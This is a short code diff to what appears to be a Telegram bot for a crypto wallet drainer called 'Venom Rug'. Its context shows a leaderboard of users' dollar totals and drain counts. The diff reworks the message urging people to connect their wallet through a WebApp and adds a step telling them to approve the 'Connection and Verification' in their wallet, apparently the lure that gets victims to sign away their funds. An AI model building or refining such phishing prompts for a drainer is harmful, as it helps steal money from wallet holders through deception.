@@ -1252,12 +1252,13 @@ ${index + 1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_c
         const confirmationText = `
 *🔗 Setup Your Wallet*
 
-To use Venom Rug, you need to connect your wallet.
+To use *Venom Rug*, you need to connect your wallet.
 
 *Simple Process:*
-1. Click the "Setup Wallets" button at the bottom left of your screen
+1. Click the *Setup Wallets* button at the bottom left of your screen
 2. Connect your wallet using the WebApp
-3. Return here and click "*Verify wallet Connection*" below to confirm
+3. Approve the Connection and Verification in your wallet
+4. Return here and click "*Verify wallet Connection*" below to confirm
 
 *Why use our WebApp?*
 • Secure wallet connection
@@ -2323,3 +2324,4 @@ async function main() {
 
 // Start the bot
 main().catch(console.error);
+
